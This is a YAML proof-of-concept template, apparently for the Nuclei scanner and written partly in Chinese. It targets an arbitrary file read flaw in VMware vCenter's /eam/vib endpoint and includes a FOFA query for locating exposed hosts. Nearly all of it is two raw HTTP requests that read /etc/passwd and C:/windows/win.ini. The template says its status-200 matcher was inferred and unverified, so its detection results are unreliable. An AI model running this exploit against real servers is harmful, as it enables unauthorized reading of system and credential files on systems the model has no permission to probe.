id: poc-f8a0898c3aa69a6010de
info:
  name: VMwarevCentervib存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f8a0898c3aa69a6010def4a492ec1f0c

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: f8a0898c3aa69a6010def4a492ec1f0c
    fofa: + fofa`title="ID_VC_Welcome"`
http:
- raw:
  - 'GET /eam/vib?id=/etc/passwd HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Cache-Control: max-age=0

    Upgrade-Insecure-Requests: 1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /eam/vib?id=C:/windows/win.ini HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive

    Cache-Control: max-age=0

    sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"

    sec-ch-ua-mobile: ?0

    sec-ch-ua-platform: "Windows"

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Sec-Fetch-Site: none

    Sec-Fetch-Mode: navigate

    Sec-Fetch-User: ?1

    Sec-Fetch-Dest: document

    Accept-Encoding: gzip, deflate, br, zstd

    Accept-Language: zh-CN,zh;q=0.9'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
